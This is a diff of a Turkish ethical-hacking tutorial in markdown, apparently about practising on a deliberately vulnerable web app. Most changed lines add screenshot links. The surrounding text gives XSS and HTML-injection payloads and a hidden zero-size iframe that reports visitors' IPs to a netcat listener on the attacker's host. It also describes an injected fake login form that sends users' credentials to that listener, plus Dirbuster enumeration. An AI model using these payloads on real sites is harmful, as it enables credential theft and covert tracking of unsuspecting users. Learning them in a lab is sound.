@@ -173,7 +173,7 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 | şifre | bug |
 
 - Hangi açık üzerinden gitmek istiyorsak onu ve zorluk level'ini seçebiliriz
-![]()
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/1.jpeg)
 
 > ## HTML Injection Reflected ( low level )
 
@@ -185,12 +185,12 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 
 - Burpsuite açıyoruz ve ```Intercept -> ıntercept is on``` yapıyoruz. Artık sitede işlem yapmadan önce yakalayıp bize yollayacak
 - ```Forward```'a basarak işlemi yolluyoruz
-![]()
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/2.jpeg)
 - Site'nin name kısmına ```<h1>ahmet</h1>``` yazıyoruz ve deniyoruz
-![]()
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/3.jpeg)
 - ```HTML injection cheat sheet github```'ı google'llıyoruz ve yazabileceğimiz diğer HTML kodlarını görüyoruz
 - Name kısmına ```<h1>Hello<script>alert(1)</script>!</h1>```
-![]()
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/4.jpeg)
 ! Eğer çalışıyorsa sitede HTML injection vardır ve JS kodu çalıştırılabiliyordur
 
 > ## HTML Injection Stored ( low level )
@@ -205,7 +205,7 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 - ```nc -nvlp 4545``` ile NATCAT açıyoruz
 - ```<iframe src="http://192.168.123.123:4545/test" height="0" width="0"></iframe>``` Normalde IP adresimiz bizim Publıc IP'miz olmalıdır, Port numarası çalışmazsa değiştirilebilir, ```height ve width```'i blog'a eklenen şey görülmesin diye 0 yapıyoruz
 - Artık o siteye giren cihazların IP adreslerini görebiliriz
-- ![]()
+- ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/5.jpeg)
 
 > ## Formlardan Kullanıcı Adı ve Şifre Hackleme
 
@@ -222,7 +222,7 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 ```
 - Yazdığımız HTML kodunu blog'a yapıştırıyoruz. Kodu yazdığımız sitenin kendi login ekranının hazır HTML kodlarınıda yapıştırabiliriz
 - Kullanıcılar o kısıma login yaptıklarında giriş bilgilerini ```NATCAT``` üzerinden görebiliriz
-![]()
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/6.jpeg)
 
 > ## Dirbuster
 
@@ -237,12 +237,12 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 - ```Result``` kısmına tıklarsak sonuçları (subdomainleri) görebiliriz
 ! HTTP 80 portunu kullanır
 - ```Responsu 200``` olanlar gerçekten bulunur, diğerleri hata verebilir
-
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/8.jpeg)
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/9.jpeg)
 > ## iFrame Injection
 
 - Siteye sağ tıklayıp ```view page source``` açıyoruz
 - ```CTRL+F``` yapıp ```iframe``` arıyoruz
-![]()
 - ```<iframe frameborder="0" src="robots.txt" height="250" width="250"></iframe>``` kodunda bulunan ```robots.txt```'i değiştirirsek ekranda o subdomain'i görürüz
 ![]()
 ![]()
